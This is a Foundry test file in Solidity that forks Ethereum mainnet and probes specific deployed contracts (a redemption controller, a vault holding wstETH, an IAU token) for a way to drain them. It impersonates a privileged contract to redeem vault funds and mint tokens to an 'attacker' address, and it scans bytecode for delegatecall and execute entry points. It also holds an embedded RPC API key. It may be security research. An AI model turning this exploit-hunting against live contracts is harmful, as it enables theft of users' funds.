// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

contract RedemptionStorageManipulation is Test {
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_DirectStorageManipulation() public {
        console.log("=== DIRECT STORAGE MANIPULATION TEST ===\n");

        // If we can directly manipulate storage (via vm.store), we can prove
        // that the vulnerability exists even if we haven't found the entry point yet

        // 1. Check current vault balance
        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBefore = IERC20(wstETH).balanceOf(attacker);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        // 2. The key question: if msg.sender is REDEMPTION_0, can we call RC.redeem?
        // Let's try by pranking as REDEMPTION_0

        vm.startPrank(REDEMPTION_0);

        console.log("\nCalling RC.redeem(100e18, attacker) as REDEMPTION_0...");
        (bool success, bytes memory data) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        console.log("Success:", success);
        if (!success && data.length >= 4) {
            console.log("Error:");
            console.logBytes4(bytes4(data));
        }

        vm.stopPrank();

        // 3. Check results
        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerAfter = IERC20(wstETH).balanceOf(attacker);
        
        console.log("\nVault wstETH after:", vaultAfter / 1e18);
        console.log("Attacker wstETH gained:", (attackerAfter - attackerBefore) / 1e18);

        if (attackerAfter > attackerBefore) {
            console.log("\n*** VULNERABILITY CONFIRMED! ***");
            console.log("Attacker received wstETH from Vault when calling RC.redeem as REDEMPTION_0");
        }
    }

    function test_FindRedemptionDelegatecallPath() public view {
        console.log("=== FINDING REDEMPTION DELEGATECALL PATH ===\n");

        // Redemption has 8 DELEGATECALLs
        // One at offset 5323 has SLOAD before it
        // This might be loading an action address from storage

        bytes memory code = REDEMPTION_0.code;

        console.log("Analyzing DELEGATECALL at offset 5323:");
        console.log("Bytecode around 5290-5350:");

        for (uint i = 5290; i < 5350 && i < code.length; i++) {
            uint8 op = uint8(code[i]);
            string memory opName;

            if (op == 0x54) opName = "SLOAD";
            else if (op == 0x55) opName = "SSTORE";
            else if (op == 0xf4) opName = "DELEGATECALL";
            else if (op == 0x35) opName = "CALLDATALOAD";
            else if (op >= 0x60 && op <= 0x7f) opName = "PUSH";
            else opName = "";

            if (bytes(opName).length > 0) {
                console.log(i, opName, op);
            }
        }

        // Check what storage slots contain addresses
        console.log("\nRedemption storage addresses:");
        for (uint i = 0; i < 20; i++) {
            bytes32 slot = vm.load(REDEMPTION_0, bytes32(i));
            address addr = address(uint160(uint256(slot)));
            if (addr != address(0) && addr.code.length > 0) {
                console.log("Slot", i, "->", addr);
            }
        }
    }

    function test_ExploitViaIAUMint() public {
        console.log("=== EXPLOIT VIA IAU MINT ===\n");

        // REDEMPTION_0 has minter role on IAU
        // If we can execute code as REDEMPTION_0, we can:
        // 1. Mint unlimited IAU
        // 2. Use that IAU to redeem

        // But we need to find how to execute as REDEMPTION_0
        // Let's check if there's any function in REDEMPTION_0 that does delegatecall

        vm.startPrank(REDEMPTION_0);

        uint256 attackerIAUBefore = IERC20(IAU).balanceOf(attacker);
        console.log("Attacker IAU before:", attackerIAUBefore / 1e18);

        // If REDEMPTION_0 has mint permissions, it should work
        console.log("\nCalling IAU.mint(attacker, 1000e18) as REDEMPTION_0...");
        (bool success, ) = IAU.call(
            abi.encodeWithSignature("mint(address,uint256)", attacker, 1000e18)
        );
        console.log("Success:", success);

        vm.stopPrank();

        uint256 attackerIAUAfter = IERC20(IAU).balanceOf(attacker);
        console.log("Attacker IAU after:", attackerIAUAfter / 1e18);

        if (attackerIAUAfter > attackerIAUBefore) {
            console.log("\n*** MINTING WORKS AS REDEMPTION_0! ***");
        }
    }

    function test_CheckRedemptionExecuteFunction() public {
        console.log("=== CHECKING FOR EXECUTE FUNCTIONS ===\n");

        // Many contracts have execute/multicall that could be abused
        bytes memory code = REDEMPTION_0.code;

        bytes4[] memory execSels = new bytes4[](15);
        execSels[0] = bytes4(keccak256("execute(address,bytes)"));
        execSels[1] = bytes4(keccak256("execute(address,uint256,bytes)"));
        execSels[2] = bytes4(keccak256("multicall(bytes[])"));
        execSels[3] = bytes4(keccak256("delegateCall(address,bytes)"));
        execSels[4] = bytes4(keccak256("call(address,bytes)"));
        execSels[5] = bytes4(keccak256("functionCall(address,bytes)"));
        execSels[6] = bytes4(keccak256("functionDelegateCall(address,bytes)"));
        execSels[7] = bytes4(keccak256("executeAction(bytes,bytes32[],bytes32[],uint8[])"));
        execSels[8] = bytes4(keccak256("callAction(address,bytes)"));
        execSels[9] = bytes4(keccak256("performAction(address,bytes)"));
        execSels[10] = bytes4(keccak256("doAction(address,bytes)"));
        execSels[11] = bytes4(keccak256("batch(bytes[])"));
        execSels[12] = bytes4(keccak256("batchCall(bytes[])"));
        execSels[13] = bytes4(keccak256("aggregate(tuple(address,bytes)[])"));
        execSels[14] = bytes4(keccak256("tryAggregate(bool,tuple(address,bytes)[])"));

        console.log("Searching for execute/multicall selectors:");
        for (uint s = 0; s < execSels.length; s++) {
            for (uint i = 0; i + 3 < code.length; i++) {
                bytes4 sel = bytes4(bytes.concat(code[i], code[i+1], code[i+2], code[i+3]));
                if (sel == execSels[s]) {
                    console.logBytes4(execSels[s]);
                    console.log("  Found at offset:", i);
                    break;
                }
            }
        }
    }

    function test_TraceRCRedeemInternals() public {
        console.log("=== TRACING RC.REDEEM INTERNALS ===\n");

        // Let's understand exactly what RC.redeem does
        bytes memory code = REDEMPTION_CONTROLLER.code;

        // redeem(uint256,address) = 0x7bde82f2
        bytes4 redeemSel = bytes4(keccak256("redeem(uint256,address)"));
        console.log("redeem selector:");
        console.logBytes4(redeemSel);

        // Find it in bytecode
        for (uint i = 0; i + 3 < code.length; i++) {
            bytes4 sel = bytes4(bytes.concat(code[i], code[i+1], code[i+2], code[i+3]));
            if (sel == redeemSel) {
                console.log("Found at offset:", i);
            }
        }

        // Count CALLs - these are transfers
        uint256 callCount = 0;
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf1) callCount++;
        }
        console.log("\nTotal CALL opcodes in RC:", callCount);

        // Find transferFrom selector
        bytes4 transferFromSel = bytes4(0x23b872dd);
        console.log("\nSearching for transferFrom calls:");
        for (uint i = 0; i + 3 < code.length; i++) {
            bytes4 sel = bytes4(bytes.concat(code[i], code[i+1], code[i+2], code[i+3]));
            if (sel == transferFromSel) {
                console.log("  transferFrom at offset:", i);
            }
        }
    }
}
